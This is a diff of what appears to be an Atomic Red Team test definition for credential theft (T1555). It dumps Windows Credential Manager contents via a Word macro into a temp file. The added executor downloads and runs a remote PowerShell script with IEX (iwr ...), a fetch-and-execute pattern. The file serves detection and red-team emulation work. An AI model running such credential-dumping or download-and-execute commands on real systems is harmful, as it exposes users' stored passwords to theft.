@@ -1,57 +1,30 @@
 attack_technique: T1555
 display_name: 'Credentials from Password Stores'
 atomic_tests:
-- name: Extract Windows Credential Manager via Maldoc
+- name: Extract Windows Credential Manager via VBA
   auto_generated_guid: 
   description: |
-    Adversaries may search for common password storage locations to obtain user credentials. 
-    Passwords are stored in several places on a system, depending on the operating system or application 
-    holding the credentials. There are also specific applications that store passwords to make it 
-    easier for users manage and maintain. Once credentials are obtained, they can be used to 
-    perform lateral movement and access restricted information.
-
-    This module will extract the credentials found within the Windows credential manager
+    This module will extract the credentials found within the Windows credential manager and dump
+    them to $env:TEMP\windows-credentials.txt
   supported_platforms:
   - windows
-  input_arguments:
-    ms_product:
-      description: Maldoc application Word or Excel
-      type: String
-      default: Word
-    ms_office_version:
-      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-      type: String
-      default: $(((Get-ChildItem Registry::HKEY_CURRENT_USER\Software\Microsoft\Office -Name | select-string -pattern "^\d+\.\d+$").line.foreach({[decimal]$_}) | Sort-Object -desc)[0])
-    sub_name:
-      description: Name of Sub to execute
-      type: String
-      default: Extract
-    macrocode:
-      description: Path to Macrocode to execute
-      type: Path
-      default: PathToAtomicsFolder\T1555\src\T1555-macrocode.txt
   dependency_executor_name: powershell
   dependencies:
   - description: |
-      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys.
+      Microsoft Word must be installed
     prereq_command: |
-      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+      try {
+        New-Object -COMObject "word.Application" | Out-Null
+        $process = "word"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
     get_prereq_command: |
-      $msword = New-Object -ComObject word.application
-      Stop-Process -Name WINWORD
-  - description: |
-      Test Requires #{macrocode} to exist.
-    prereq_command: |
-      if (Test-Path "#{macrocode}") { exit 0 } else { exit 1 }
-    get_prereq_command: |
-      write-host "Provide #{macrocode} file"    
+      Write-Host "You will need to install Microsoft Word manually to meet this requirement"
   executor:
     command: |
-      Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Public\Invoke-MalDoc.ps1  
-      Invoke-MalDoc #{macrocode} "#{sub_name}" "#{ms_office_version}" "#{ms_product}"
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
     cleanup_command: |
-      $fname = "$env:TEMP\windows-credentials.txt"
-      if (Test-Path $fname) {
-        Remove-Item $fname
-      }
+      Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
     name: powershell
